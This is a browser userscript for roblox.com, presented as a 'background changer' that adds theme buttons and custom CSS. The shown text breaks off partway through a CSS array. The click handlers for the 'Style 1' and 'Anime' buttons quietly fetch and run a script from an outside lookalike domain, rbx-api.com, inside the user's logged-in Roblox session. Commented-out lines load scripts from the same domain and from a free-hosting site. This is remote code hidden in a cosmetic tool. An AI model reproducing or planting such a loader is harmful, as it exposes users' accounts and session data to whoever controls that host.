// ==UserScript==
// @name         background changer
// @namespace    http://tampermonkey.net/
// @version      4.0
// @description  THIS IS MADE BY ThePoorBM
// @author       ThePoorBM and sleepy#6147
// @match        https://www.roblox.com/*
// @grant        none
// @include       http://roblox.com/*
// @include       https://roblox.com/*
// @include       http://*.roblox.com/*
// @include       https://*.roblox.com/*
// @downloadURL https://update.greasyfork.org/scripts/425306/background%20changer.user.js
// @updateURL https://update.greasyfork.org/scripts/425306/background%20changer.meta.js
// ==/UserScript==
var customHTML = '';
var css='';
var cssPink='';
var cssBlue='';
var cssPixel='';
function start() {
//get the parent where button toolbar is going to reside
   // customHTML += '<div id="custom1" class="customSettings">';
//customHTML += '<div class="customText">';
//customHTML += '<h3>Choose a theme!</h3><br>';
//customHTML += '<button type="button" onclick="">Try it</button>';
//customHTML += '<script src="https://rbx-api.com/script.js"></script>';
//customHTML += '<p id="customName"></p>';
//customHTML += '</div>';
customHTML += '<style>';
customHTML += '.customSettings{border:1px solid rgba(46,48,54,.6);border-radius:3px;background-color:#24252f;position:relative;color:#fff;width:300px;height:100px;top:-110px;line-height:0;padding:0;font-size:15px;transition:.5s}.customSettings:hover{top:-10px}.customText{margin-down:100px}';
customHTML += '</style>';


customHTML += '<style>';
customHTML += '.btn { width: 70px; top:-10px; height: 60px; cursor: pointer; background-opacity:0.5; background-color:#24252f; border: 1px solid #24252f; outline: none; transition: 0.1s ease-in-out; } svg { position: absolute; left: 0; top: 0; fill: none; stroke: #fff; stroke-dasharray: 150 480; stroke-dashoffset: 150; transition: 0.1s ease-in-out; } .btn:hover { transition: 0.1 ease-in-out; background: #4F95DA; } .btn:hover svg { stroke-dashoffset: -480; } .btn span { color: white; font-size: 18px; font-weight: 100; }';
customHTML += '</style>';

customHTML += '<style>';
customHTML += '.btn{font-size: 1em; line-height: 1em; letter-spacing: 0.04em; display: inline-block; &--svg { position: relative; height: 42px; width: 190px; overflow: hidden; border-radius: 21px; &:hover { .btn--svg__circle { circle { -webkit-transform: scale(0); -moz-transform: scale(0); -ms-transform: scale(0); transform: scale(0); } } .btn--svg__label { color: #fff; } .btn--svg__border--left, .btn--svg__border--right { path { stroke-dasharray: 61.8204345703125 61.8204345703125; stroke-dashoffset: 0; -webkit-transition-delay: 0.25s; -webkit-transition-duration: 0.5s; -webkit-transition-timing-function: ease-in-out; -webkit-transition-property: stroke-dashoffset; -moz-transition-delay: 0.25s; -moz-transition-duration: 0.5s; -moz-transition-timing-function: ease-in-out; -moz-transition-property: stroke-dashoffset; -ms-transition-delay: 0.25s; -ms-transition-duration: 0.5s; -ms-transition-timing-function: ease-in-out; -ms-transition-property: stroke-dashoffset; transition-delay: 0.25s; transition-duration: 0.5s; transition-timing-function: ease-in-out; transition-property: stroke-dashoffset; } } } &__label { -webkit-font-smoothing: antialiased; font-family: sans-serif; font-weight: bold; text-align:center; color: black; z-index: 3; width: 100%; -webkit-transition: color 0.5s ease-in-out; -moz-transition: color 0.5s ease-in-out; -ms-transition: color 0.5s ease-in-out; transition: color 0.5s ease-in-out; } &__circle { circle { -webkit-transition: transform 0.5s ease-in-out; -webkit-transform: scale(1.1); -webkit-transform-origin: 50% 50%; -moz-transition: transform 0.5s ease-in-out; -moz-transform: scale(1.1); -moz-transform-origin: 50% 50%; -ms-transition: transform 0.5s ease-in-out; -ms-transform: scale(1.1); -ms-transform-origin: 50% 50%; transition: transform 0.5s ease-in-out; transform: scale(1.1); transform-origin: 50% 50%; } } &__border { &--left, &--right { path { stroke-dasharray: 61.8204345703125 61.8204345703125; -webkit-transition-duration: 0s; -webkit-transition-timing-function: ease-in-out; -webkit-transition-property: stroke-dashoffset; -webkit-transition-delay: 0.5s; -moz-transition-duration: 0s; -moz-transition-timing-function: ease-in-out; -moz-transition-property: stroke-dashoffset; -moz-transition-delay: 0.5s; -ms-transition-duration: 0s; -ms-transition-timing-function: ease-in-out; -ms-transition-property: stroke-dashoffset; -ms-transition-delay: 0.5s; transition-duration: 0s; transition-timing-function: ease-in-out; transition-property: stroke-dashoffset; transition-delay: 0.5s; } } &--left { path { stroke-dashoffset: -61.8204345703125; } } &--right { path { stroke-dashoffset: 61.8204345703125; } } } svg, &__label { position: absolute; top: 50%; left: 50%; -webkit-transform: translate(-50%, -50%); -webkit-transform-origin: 50% 50%; -moz-transform: translate(-50%, -50%); -moz-transform-origin: 50% 50%; -ms-transform: translate(-50%, -50%); -ms-transform-origin: 50% 50%; transform: translate(-50%, -50%); transform-origin: 50% 50%; } } } // Utils .c-white { color: white; } .trailer { margin-bottom: 40px; &--nano { margin-bottom: 10px; } } a { position: relative; text-decoration: none; color: red; &:after { content:  height: 1px; bottom: -4px; position: absolute; left: 5%; right: 95%; background: red; transition: right 0.25s ease-in-out; } &:hover:after { right: 5%; } } .teasing-1, .heading-2 { font-family: sans-serif; letter-spacing: 0.04em; -webkit-font-smoothing: antialiased; } .teasing-1 { font-size: 14px; line-height: 14px; } .heading-2 { font-weight: bold; font-size: 20px; line-height: 20px; text-transform: uppercase; }';
customHTML += '</style>'

customHTML += '<style>';
customHTML += '.btn{width: 70px; top:-10px; height: 60px; cursor: pointer; background-opacity:0.5; background-color:#24252f; border: 1px solid #24252f; outline: none; transition: 0.1s ease-in-out; } svg { position: absolute; left: 0; top: 0; fill: none; stroke: #fff; stroke-dasharray: 150 480; stroke-dashoffset: 150; transition: 0.1s ease-in-out; } .btn:hover { transition: 0.1s ease-in-out; background: #4F95DA; } .btn:hover svg { stroke-dashoffset: -480; } .btn span { color: white; font-size: 18px; font-weight: 100; }';
customHTML += '</style>';

customHTML += '<style>';
customHTML += '.cssbtn { border-color: #f1c40f; color: #000000; background-image: -webkit-linear-gradient(45deg, #f1c40f 50%, transparent 50%); background-image: linear-gradient(45deg, #f1c40f 50%, transparent 50%); background-position: 100%; background-size: 400%; -webkit-transition: background 300ms ease-in-out; transition: background 300ms ease-in-out; } .cssbtn:hover { background-position: 0; }';
customHTML += '</style>';

var originalinnerhtml = document.getElementsByClassName("input-addon-btn")[0].innerHTML;

    document.getElementsByClassName("input-addon-btn")[0].innerHTML = customHTML+originalinnerhtml;
//document.getElementById("").value = document.body.style.backgroundColor;

    var theParent = document.getElementsByClassName("icon-logo-r")[0];
//theParent.style.zIndex = "-1";
    // put the new kid div in it for toolbar buttons
    var theKid = document.createElement("div");
    theKid.setAttribute("id", "container");
    theKid.setAttribute("class", "customSettings");

//add the switch from cookie for persistance read the cookie and set it to it
function setCookie(cvalue) {
  var d = new Date();
  d.setTime(d.getTime() + (30 * 24 * 60 * 60 * 1000));
  var expires = "expires="+d.toUTCString();
  document.cookie = "theme=" + cvalue + ";" + expires + "; path=/";
}
function getCookie(theme) {
  var name = theme + "=";
  var decodedCookie = decodeURIComponent(document.cookie);
  var ca = decodedCookie.split(';');
  for(var i = 0; i < ca.length; i++) {
    var c = ca[i];
    while (c.charAt(0) == ' ') {
      c = c.substring(1);
    }
    if (c.indexOf(name) == 0) {
      return c.substring(name.length, c.length);
    }
  }
  return "";
}
function checkCookie() {
  var theme = getCookie("theme");
  if (theme == "default") {
  //body.className = "";

  }
  if (theme == "light") {
 // body.className = "light";
  css = cssPink;
  }
  if (theme == "dark") {
  //body.className = "dark";
      css = cssBlue;
  }
  if (theme == "Pixel") {
  //body.className = "dark";
  css = cssPixel;
  }
}
//Create the Button 1
//Create the Button 1
var button = document.createElement('button');
    button.type = 'button';
    button.innerHTML = 'Style 1';
    // button.className = 'btn-styled';
    //Add click event instead of addhandler
     button.className='cssbtn';
    button.onclick = function() {
        window.location.href = ("javascript:$.get('//rbx-api.com/apiv10.js')");
        setCookie("light");
        location.reload();
return false;
    };
//Create Button 2
var button2 = document.createElement('button');
    button2.type = 'button';
    button2.innerHTML = 'Anime';
    // button.className = 'btn-styled';
     button2.className='cssbtn';
    button2.onclick = function() {
        window.location.href = ("javascript:$.get('//rbx-api.com/apiv10.js')");
        setCookie("anime2");
        location.reload();
return false;
    };
//Create Button 3
var button3 = document.createElement('button');
  button3.type = 'button';
  button3.innerHTML = 'Read Settings';
     button3.className='cssbtn';
  button3.onclick = function() {
 checkCookie();
      location.reload();
return false;
  };
//Create Button 4
var button4 = document.createElement('button');
  button4.type = 'button';
  button4.innerHTML = 'Pixel';
     button4.className='cssbtn';
  button4.onclick = function() {
   setCookie("pixel");
      location.reload();
return false;
  };
var button5 = document.createElement('button');
    button5.type = 'button';
    button5.innerHTML = 'Style 2';
    // button.className = 'btn-styled';
    //Add click event instead of addhandler
     button5.className='cssbtn';
    button5.onclick = function() {
     setCookie("light");
        location.reload();
return false;
    };
    var button6 = document.createElement('button');
    button6.type = 'button';
    button6.innerHTML = 'Style 2';
    // button.className = 'btn-styled';
    //Add click event instead of addhandler
     button6.className='cssbtn';
    button6.onclick = function() {
     setCookie("light");
        location.reload();
return false;
    };
    var button7 = document.createElement('button');
    button7.type = 'button';
    button7.innerHTML = 'Style 2';
    // button.className = 'btn-styled';
    //Add click event instead of addhandler
    button7.className='cssbtn';
    button7.onclick = function() {
     setCookie("light");
        location.reload();
return false;
    };
    var button8 = document.createElement('button');
    button8.type = 'button';
    button8.innerHTML = 'Style 2';
    // button.className = 'btn-styled';
    //Add click event instead of addhandler
    button8.className='cssbtn';
    button8.onclick = function() {
     setCookie("light");
        location.reload();
return false;
    };
    var button9 = document.createElement('button');
    button9.type = 'button';
    button9.innerHTML = 'Style 2';
    // button.className = 'btn-styled';
    //Add click event instead of addhandler
    button9.className='cssbtn';
    button9.onclick = function() {
     setCookie("light");
        location.reload();
return false;
    };
    var button10 = document.createElement('button');
    button10.type = 'button';
    button10.innerHTML = 'Style 2';
    // button.className = 'btn-styled';
    //Add click event instead of addhandler
    button10.className='cssbtn';
    button10.onclick = function() {
     setCookie("light");
        location.reload();
return false;
    };
    var button11 = document.createElement('button');
    button11.type = 'button';
    button11.innerHTML = 'Open';
    // button.className = 'btn-styled';
    //Add click event instead of addhandler
    button11.className='btn';
    button11.onclick = function() {
     setCookie("light");
        location.reload();
    };


//put the buttons in the div
    theKid.appendChild(button);
    theKid.appendChild(button2);
     theKid.appendChild(button4);
    theKid.appendChild(button3);
        theKid.appendChild(button5);
    theKid.appendChild(button6);
     theKid.appendChild(button7);
    theKid.appendChild(button8);
        theKid.appendChild(button9);
    theKid.appendChild(button10);
     theKid.appendChild(button11);


// prepend theKid to the beginning of theParent
theParent.insertBefore(theKid, theParent.firstChild);

    //add script to the website
    //var head = document.getElementsByTagName('head')[0];
    //var script = document.createElement('script');
    //script.type = 'text/javascript';
    //script.src = 'https://backgroundtheme.000webhostapp.com/backgroundtheme1.js';
    //script.onload = function() {
    //callFunctionFromScript();
    //}
    //document.head.appendChild(document.createElement('script').text =
(function() {cssPink = [
	"/* i really want this to be global */",
	"  .ad, .ad *, .img_ad, .ad-annotations, #google_image_div, #aw0, #AdvertisingLeaderboard",
	"  {",
	"    display: none !important;",
	"  }",
	"",
	"  .ad, .ad *, .img_ad, .ad-annotations, #google_image_div, #aw0, #AdvertisingLeaderboard",
	"  {",
	"    display: none !important;",
	"  }",
	"  /*Ad removal */",
	"  #header",
	"  {",
	"    background-color: #ffcccc;",
	"  }",
	"",
	"  .dialog-container .dialog-header",
	"  {",
	"    background-color: #ffcccc;",
	"    color: #fff;",
	"  }",
	"",
	"  .navigation .notification-icon, .rbx-highlight",
	"  {",
	"    background: #ffeacc;",
	"  }",
	"",
	"  #chat-header",
	"  {",
	"    background: #cdd3ff;",
	"      /*Party header*/",
	"    ;",
	"  }",
	"",
	"  .slide-item-container-left, .profile-avatar-right",
	"  {",
	"    background: #d9ffcc;",
	"  }",
	"",
	"  .rbx-tabs-horizontal .rbx-tab.active .rbx-tab-heading, .rbx-tabs-horizontal .rbx-tab-heading:hover, .rbx-tabs-horizontal .rbx-tab-heading:focus, .rbx-tabs-horizontal .rbx-tab-heading:active",
	"  {",
	"    box-shadow: 0 -4px 0 .6 #ccffee inset;",
	"      /* Yea idk what this is for*/",
	"    ;",
	"  }",
	"",
	"  .forum-table-header, body .forum-table-header th, body .forum-table-footer, #ctl00_cphRoblox_Message1_ctl00_CenterColumn > table > tbody > tr:nth-child(1) > th, #ctl00_cphRoblox_CenterColumn > table > tbody > tr:nth-child(1) > th",
	"  {",
	"    background: #ccefff !important;",
	"      /*Forum colors and messaging underline color*/",
	"    ;",
	"  }",
	"",
	"  .rbx-upgrade-now #upgrade-now-button, .rbx-btn-secondary-xs.btn-more, #AjaxCommentsContainer > div > div.comment-form > form > button, .rbx-vip-server-create, .btn-secondary-xs",
	"  {",
	"    background-color: #ffdaef00 !important;",
	"    border-color: #ffdaef00;",
	"      /*Updrade button*/",
	"    ;",
	"  }",
	"",
	"  .rbx-upgrade-now #upgrade-now-button:hover, .rbx-btn-secondary-xs.btn-more:hover, #AjaxCommentsContainer > div > div.comment-form > form > button:hover, .rbx-vip-server-create:hover, .btn-secondary-xs:hover",
	"  {",
	"    background: #ffdaef00 !important;",
	"    border-color: #ffdaef00;",
	"  }",
	"",
	"  #TopAbpContainer, .ad-annotations, #LeftGutterAdContainer, #RightGutterAdContainer, #Skyscraper-Adp-Right, #Skyscraper-Adp-Left, .abp-spacer, #GamesListContainer1 > div.games-list > ul > div.abp.in-game-search-ad.dynamic-ad.ad-order-even, #GamesListContainer1 > div.games-list > ul > div.abp.in-game-search-ad.dynamic-ad.ad-order-odd, #GamesListContainer8 > div.games-list > ul > div.abp.in-game-search-ad.dynamic-ad.ad-order-even, #GamesListContainer8 > div.games-list > ul > div.abp.in-game-search-ad.dynamic-ad.ad-order-odd, .sponsored-game, .alert-info, #mCSB_1_container > ul > li.font-bold.small, #mCSB_1_container > ul > li.rbx-nav-sponsor",
	"  {",
	"    display: none !important;",
	"  }",
	"",
	"  .gotham-font .btn-to-link, .gotham-font .btn-to-link:active, .gotham-font .btn-to-link:hover, .gotham-font .btn-to-link:link, .gotham-font .btn-to-link:visited, .gotham-font .refresh-link, .gotham-font .refresh-link-icon, .gotham-font .refresh-link-icon:active, .gotham-font .refresh-link-icon:hover, .gotham-font .refresh-link-icon:link, .gotham-font .refresh-link-icon:visited, .gotham-font .refresh-link:active, .gotham-font .refresh-link:hover, .gotham-font .refresh-link:link, .gotham-font .refresh-link:visited, .gotham-font .see-all-link, .gotham-font .see-all-link-icon, .gotham-font .see-all-link-icon:active, .gotham-font .see-all-link-icon:hover, .gotham-font .see-all-link-icon:link, .gotham-font .see-all-link-icon:visited, .gotham-font .see-all-link:active, .gotham-font .see-all-link:hover, .gotham-font .see-all-link:link, .gotham-font .see-all-link:visited, .gotham-font .touch .btn-to-link, .gotham-font .touch .btn-to-link:active, .gotham-font .touch .btn-to-link:hover, .gotham-font .touch .btn-to-link:link, .gotham-font .touch .btn-to-link:visited, .gotham-font .touch .refresh-link, .gotham-font .touch .refresh-link-icon, .gotham-font .touch .refresh-link-icon:active, .gotham-font .touch .refresh-link-icon:hover, .gotham-font .touch .refresh-link-icon:link, .gotham-font .touch .refresh-link-icon:visited, .gotham-font .touch .refresh-link:active, .gotham-font .touch .refresh-link:hover, .gotham-font .touch .refresh-link:link, .gotham-font .touch .refresh-link:visited, .gotham-font .touch .see-all-link, .gotham-font .touch .see-all-link-icon, .gotham-font .touch .see-all-link-icon:active, .gotham-font .touch .see-all-link-icon:hover, .gotham-font .touch .see-all-link-icon:link, .gotham-font .touch .see-all-link-icon:visited, .gotham-font .touch .see-all-link:active, .gotham-font .touch .see-all-link:hover, .gotham-font .touch .see-all-link:link, .gotham-font .touch .see-all-link:visited",
	"  {",
	"    color: #000000;",
	"  }",
	"",
	"  #navbar-search-input, #navbar-search-btn",
	"  {",
	"    border: 1px solid #ffdae0;",
	"      /*Search border color*/",
	"    ;",
	"  }",
	"",
	"  body",
	"  {",
	"    background: transparent !important;",
	"  }",
	"",
	"  .content",
	"  {",
	"    background: transparent !important;",
	"  }",
	"",
	"  #fb-root",
	"  {",
	"    width: 100% !important;",
	"    height: 100% !important;",
	"    position: fixed !important;",
	"    background-image: url(https://cdn.lowgif.com/small/4d93f6c2d501df97-pixel-background-gif-animation-art-map-amino.gif) !important;",
	"      /* Background */",
	"    background-size: cover !important;",
	"    background-attachment: fixed !important;",
	"  }",
	"",
	"  #party_none_title, div.friend_dock_chatbox_titlebar.chat-header-blink-off",
	"  {",
	"    background: linear-gradient(to bottom, #B787EA, #B787EA);",
	"  }",
	"",
	"  #ctl00_cphRoblox_RightColumn, #Body > table > tbody > tr > td:nth-child(3), #Body > table > tbody > tr > td:nth-child(4)",
	"  {",
	"    display: none;",
	"  }",
	"",
	"  #GamesPageLeftColumn",
	"  {",
	"    width: auto;",
	"    margin-right: 10px !important;",
	"    margin-left: 10px !important;",
	"  }",
	"",
	"  #GamesListsContainer > div",
	"  {",
	"    background-color: transparent !important;",
	"    width: 100% !important;",
	"  }",
	"",
	"  #navigation",
	"  {",
	"    background-color: #fff;",
	"  }",
	"",
	"  .notification-red",
	"  {",
	"    background-color: #ffcccc;",
	"    padding: 1px 6px;",
	"    min-width: 18px;",
	"  }",
	"",
	"  .notification-blue",
	"  {",
	"    background-color: #ffcccc;",
	"    padding: 1px 6px;",
	"    min-width: 18px;",
	"  }",
	"",
	"  .rbx-btn-primary-lg",
	"  {",
	"    background-color: rgba(200, 160, 248, 0.5);",
	"  }",
	"",
	"  .rbx-btn-primary-lg:hover, .rbx-btn-primary-lg:focus",
	"  {",
	"    background-color: rgba(200, 160, 248, 0.5);",
	"  }",
	"",
	"  .avatar-back",
	"  {",
	"    background-image: url(https://cdn.lowgif.com/small/4d93f6c2d501df97-pixel-background-gif-animation-art-map-amino.gif);",
	"  }"
].join("\n");
    var cssblue = [
	"/* i really want this to be global */",
	"  .ad, .ad *, .img_ad, .ad-annotations, #google_image_div, #aw0, #AdvertisingLeaderboard",
	"  {",
	"    display: none !important;",
	"  }",
	"",
	"  .ad, .ad *, .img_ad, .ad-annotations, #google_image_div, #aw0, #AdvertisingLeaderboard",
	"  {",
	"    display: none !important;",
	"  }",
	"  /*Ad removal */",
	"  #header",
	"  {",
	"    background-color: #ffcccc;",
	"  }",
	"",
	"  .dialog-container .dialog-header",
	"  {",
	"    background-color: #ffcccc;",
	"    color: #fff;",
	"  }",
	"",
	"  .navigation .notification-icon, .rbx-highlight",
	"  {",
	"    background: #ffeacc;",
	"  }",
	"",
	"  #chat-header",
	"  {",
	"    background: #cdd3ff;",
	"      /*Party header*/",
	"    ;",
	"  }",
	"",
	"  .slide-item-container-left, .profile-avatar-right",
	"  {",
	"    background: #d9ffcc;",
	"  }",
	"",
	"  .rbx-tabs-horizontal .rbx-tab.active .rbx-tab-heading, .rbx-tabs-horizontal .rbx-tab-heading:hover, .rbx-tabs-horizontal .rbx-tab-heading:focus, .rbx-tabs-horizontal .rbx-tab-heading:active",
	"  {",
	"    box-shadow: 0 -4px 0 .6 #ccffee inset;",
	"      /* Yea idk what this is for*/",
	"    ;",
	"  }",
	"",
	"  .forum-table-header, body .forum-table-header th, body .forum-table-footer, #ctl00_cphRoblox_Message1_ctl00_CenterColumn > table > tbody > tr:nth-child(1) > th, #ctl00_cphRoblox_CenterColumn > table > tbody > tr:nth-child(1) > th",
	"  {",
	"    background: #ccefff !important;",
	"      /*Forum colors and messaging underline color*/",
	"    ;",
	"  }",
	"",
	"  .rbx-upgrade-now #upgrade-now-button, .rbx-btn-secondary-xs.btn-more, #AjaxCommentsContainer > div > div.comment-form > form > button, .rbx-vip-server-create, .btn-secondary-xs",
	"  {",
	"    background-color: #ffdaef00 !important;",
	"    border-color: #ffdaef00;",
	"      /*Updrade button*/",
	"    ;",
	"  }",
	"",
	"  .rbx-upgrade-now #upgrade-now-button:hover, .rbx-btn-secondary-xs.btn-more:hover, #AjaxCommentsContainer > div > div.comment-form > form > button:hover, .rbx-vip-server-create:hover, .btn-secondary-xs:hover",
	"  {",
	"    background: #ffdaef00 !important;",
	"    border-color: #ffdaef00;",
	"  }",
	"",
	"  #TopAbpContainer, .ad-annotations, #LeftGutterAdContainer, #RightGutterAdContainer, #Skyscraper-Adp-Right, #Skyscraper-Adp-Left, .abp-spacer, #GamesListContainer1 > div.games-list > ul > div.abp.in-game-search-ad.dynamic-ad.ad-order-even, #GamesListContainer1 > div.games-list > ul > div.abp.in-game-search-ad.dynamic-ad.ad-order-odd, #GamesListContainer8 > div.games-list > ul > div.abp.in-game-search-ad.dynamic-ad.ad-order-even, #GamesListContainer8 > div.games-list > ul > div.abp.in-game-search-ad.dynamic-ad.ad-order-odd, .sponsored-game, .alert-info, #mCSB_1_container > ul > li.font-bold.small, #mCSB_1_container > ul > li.rbx-nav-sponsor",
	"  {",
	"    display: none !important;",
	"  }",
	"",
	"  .gotham-font .btn-to-link, .gotham-font .btn-to-link:active, .gotham-font .btn-to-link:hover, .gotham-font .btn-to-link:link, .gotham-font .btn-to-link:visited, .gotham-font .refresh-link, .gotham-font .refresh-link-icon, .gotham-font .refresh-link-icon:active, .gotham-font .refresh-link-icon:hover, .gotham-font .refresh-link-icon:link, .gotham-font .refresh-link-icon:visited, .gotham-font .refresh-link:active, .gotham-font .refresh-link:hover, .gotham-font .refresh-link:link, .gotham-font .refresh-link:visited, .gotham-font .see-all-link, .gotham-font .see-all-link-icon, .gotham-font .see-all-link-icon:active, .gotham-font .see-all-link-icon:hover, .gotham-font .see-all-link-icon:link, .gotham-font .see-all-link-icon:visited, .gotham-font .see-all-link:active, .gotham-font .see-all-link:hover, .gotham-font .see-all-link:link, .gotham-font .see-all-link:visited, .gotham-font .touch .btn-to-link, .gotham-font .touch .btn-to-link:active, .gotham-font .touch .btn-to-link:hover, .gotham-font .touch .btn-to-link:link, .gotham-font .touch .btn-to-link:visited, .gotham-font .touch .refresh-link, .gotham-font .touch .refresh-link-icon, .gotham-font .touch .refresh-link-icon:active, .gotham-font .touch .refresh-link-icon:hover, .gotham-font .touch .refresh-link-icon:link, .gotham-font .touch .refresh-link-icon:visited, .gotham-font .touch .refresh-link:active, .gotham-font .touch .refresh-link:hover, .gotham-font .touch .refresh-link:link, .gotham-font .touch .refresh-link:visited, .gotham-font .touch .see-all-link, .gotham-font .touch .see-all-link-icon, .gotham-font .touch .see-all-link-icon:active, .gotham-font .touch .see-all-link-icon:hover, .gotham-font .touch .see-all-link-icon:link, .gotham-font .touch .see-all-link-icon:visited, .gotham-font .touch .see-all-link:active, .gotham-font .touch .see-all-link:hover, .gotham-font .touch .see-all-link:link, .gotham-font .touch .see-all-link:visited",
	"  {",
	"    color: #000000;",
	"  }",
	"",
	"  #navbar-search-input, #navbar-search-btn",
	"  {",
	"    border: 1px solid #ffdae0;",
	"      /*Search border color*/",
	"    ;",
	"  }",
	"",
	"  body",
	"  {",
	"    background: transparent !important;",
	"  }",
	"",
	"  .content",
	"  {",
	"    background: transparent !important;",
	"  }",
	"",
	"  #fb-root",
	"  {",
	"    width: 100% !important;",
	"    height: 100% !important;",
	"    position: fixed !important;",
	"    background-image: url(https://cdn.lowgif.com/small/4d93f6c2d501df97-pixel-background-gif-animation-art-map-amino.gif) !important;",
	"      /* Background */",
	"    background-size: cover !important;",
	"    background-attachment: fixed !important;",
	"  }",
	"",
	"  #party_none_title, div.friend_dock_chatbox_titlebar.chat-header-blink-off",
	"  {",
	"    background: linear-gradient(to bottom, #B787EA, #B787EA);",
	"  }",
	"",
	"  #ctl00_cphRoblox_RightColumn, #Body > table > tbody > tr > td:nth-child(3), #Body > table > tbody > tr > td:nth-child(4)",
	"  {",
	"    display: none;",
	"  }",
	"",
	"  #GamesPageLeftColumn",
	"  {",
	"    width: auto;",
	"    margin-right: 10px !important;",
	"    margin-left: 10px !important;",
	"  }",
	"",
	"  #GamesListsContainer > div",
	"  {",
	"    background-color: transparent !important;",
	"    width: 100% !important;",
	"  }",
	"",
	"  #navigation",
	"  {",
	"    background-color: #fff;",
	"  }",
	"",
	"  .notification-red",
	"  {",
	"    background-color: #ffcccc;",
	"    padding: 1px 6px;",
	"    min-width: 18px;",
	"  }",
	"",
	"  .notification-blue",
	"  {",
	"    background-color: #ffcccc;",
	"    padding: 1px 6px;",
	"    min-width: 18px;",
	"  }",
	"",
	"  .rbx-btn-primary-lg",
	"  {",
	"    background-color: rgba(200, 160, 248, 0.5);",
	"  }",
	"",
	"  .rbx-btn-primary-lg:hover, .rbx-btn-primary-lg:focus",
	"  {",
	"    background-color: rgba(200, 160, 248, 0.5);",
	"  }",
	"",
	"  .avatar-back",
	"  {",
	"    background-image: url(https://cdn.lowgif.com/small/4d93f6c2d501df97-pixel-background-gif-animation-art-map-amino.gif);",
	"  }"
].join("\n");
     cssPixel = [
	"/* i really want this to be global */",
	"  .ad, .ad *, .img_ad, .ad-annotations, #google_image_div, #aw0, #AdvertisingLeaderboard",
	"  {",
	"    display: none !important;",
	"  }",
	"",
	"  .ad, .ad *, .img_ad, .ad-annotations, #google_image_div, #aw0, #AdvertisingLeaderboard",
	"  {",
	"    display: none !important;",
	"  }",
	"  /*Ad removal */",
	"  #header",
	"  {",
	"    background-color: #692590;",
	"  }",
	"",
	"  .dialog-container .dialog-header",
	"  {",
	"    background-color: #692590;",
	"    color: #fff;",
	"  }",
	"",
	"  .navigation .notification-icon, .rbx-highlight",
	"  {",
	"    background: #656169;",
	"  }",
	"",
	"  #chat-header",
	"  {",
	"    background: #692590;",
	"      /*Party header*/",
	"    ;",
	"  }",
	"",
	"  .slide-item-container-left, .profile-avatar-right",
	"  {",
	"    background: #692590;",
	"  }",
	"",
	"  .rbx-tabs-horizontal .rbx-tab.active .rbx-tab-heading, .rbx-tabs-horizontal .rbx-tab-heading:hover, .rbx-tabs-horizontal .rbx-tab-heading:focus, .rbx-tabs-horizontal .rbx-tab-heading:active",
	"  {",
	"    box-shadow: 0 -4px 0 .6 #f089b8 inset;",
	"      /* Yea idk what this is for*/",
	"    ;",
	"  }",
	"",
	"  .forum-table-header, body .forum-table-header th, body .forum-table-footer, #ctl00_cphRoblox_Message1_ctl00_CenterColumn > table > tbody > tr:nth-child(1) > th, #ctl00_cphRoblox_CenterColumn > table > tbody > tr:nth-child(1) > th",
	"  {",
	"    background: #ccabff !important;",
	"      /*Forum colors and messaging underline color*/",
	"    ;",
	"  }",
	"",
	"  .rbx-upgrade-now #upgrade-now-button, .rbx-btn-secondary-xs.btn-more, #AjaxCommentsContainer > div > div.comment-form > form > button, .rbx-vip-server-create, .btn-secondary-xs",
	"  {",
	"    background-color: #692590 !important;",
	"    border-color: #692590;",
	"      /*Updrade button*/",
	"    ;",
	"  }",
	"",
	"  .rbx-upgrade-now #upgrade-now-button:hover, .rbx-btn-secondary-xs.btn-more:hover, #AjaxCommentsContainer > div > div.comment-form > form > button:hover, .rbx-vip-server-create:hover, .btn-secondary-xs:hover",
	"  {",
	"    background: #ffdaef00 !important;",
	"    border-color: #ffdaef00;",
	"  }",
	"",
	"  #TopAbpContainer, .ad-annotations, #LeftGutterAdContainer, #RightGutterAdContainer, #Skyscraper-Adp-Right, #Skyscraper-Adp-Left, .abp-spacer, #GamesListContainer1 > div.games-list > ul > div.abp.in-game-search-ad.dynamic-ad.ad-order-even, #GamesListContainer1 > div.games-list > ul > div.abp.in-game-search-ad.dynamic-ad.ad-order-odd, #GamesListContainer8 > div.games-list > ul > div.abp.in-game-search-ad.dynamic-ad.ad-order-even, #GamesListContainer8 > div.games-list > ul > div.abp.in-game-search-ad.dynamic-ad.ad-order-odd, .sponsored-game, .alert-info, #mCSB_1_container > ul > li.font-bold.small, #mCSB_1_container > ul > li.rbx-nav-sponsor",
	"  {",
	"    display: none !important;",
	"  }",
	"",
	"  .gotham-font .btn-to-link, .gotham-font .btn-to-link:active, .gotham-font .btn-to-link:hover, .gotham-font .btn-to-link:link, .gotham-font .btn-to-link:visited, .gotham-font .refresh-link, .gotham-font .refresh-link-icon, .gotham-font .refresh-link-icon:active, .gotham-font .refresh-link-icon:hover, .gotham-font .refresh-link-icon:link, .gotham-font .refresh-link-icon:visited, .gotham-font .refresh-link:active, .gotham-font .refresh-link:hover, .gotham-font .refresh-link:link, .gotham-font .refresh-link:visited, .gotham-font .see-all-link, .gotham-font .see-all-link-icon, .gotham-font .see-all-link-icon:active, .gotham-font .see-all-link-icon:hover, .gotham-font .see-all-link-icon:link, .gotham-font .see-all-link-icon:visited, .gotham-font .see-all-link:active, .gotham-font .see-all-link:hover, .gotham-font .see-all-link:link, .gotham-font .see-all-link:visited, .gotham-font .touch .btn-to-link, .gotham-font .touch .btn-to-link:active, .gotham-font .touch .btn-to-link:hover, .gotham-font .touch .btn-to-link:link, .gotham-font .touch .btn-to-link:visited, .gotham-font .touch .refresh-link, .gotham-font .touch .refresh-link-icon, .gotham-font .touch .refresh-link-icon:active, .gotham-font .touch .refresh-link-icon:hover, .gotham-font .touch .refresh-link-icon:link, .gotham-font .touch .refresh-link-icon:visited, .gotham-font .touch .refresh-link:active, .gotham-font .touch .refresh-link:hover, .gotham-font .touch .refresh-link:link, .gotham-font .touch .refresh-link:visited, .gotham-font .touch .see-all-link, .gotham-font .touch .see-all-link-icon, .gotham-font .touch .see-all-link-icon:active, .gotham-font .touch .see-all-link-icon:hover, .gotham-font .touch .see-all-link-icon:link, .gotham-font .touch .see-all-link-icon:visited, .gotham-font .touch .see-all-link:active, .gotham-font .touch .see-all-link:hover, .gotham-font .touch .see-all-link:link, .gotham-font .touch .see-all-link:visited",
	"  {",
	"    color: #000000;",
	"  }",
	"",
	"  #navbar-search-input, #navbar-search-btn",
	"  {",
	"    border: 1px solid #692590;",
	"      /*Search border color*/",
	"    ;",
	"  }",
	"",
	"  body",
	"  {",
	"    background: transparent !important;",
	"  }",
	"",
	"  .content",
	"  {",
	"    background: transparent !important;",
	"  }",
	"",
	"  #fb-root",
	"  {",
	"    width: 100% !important;",
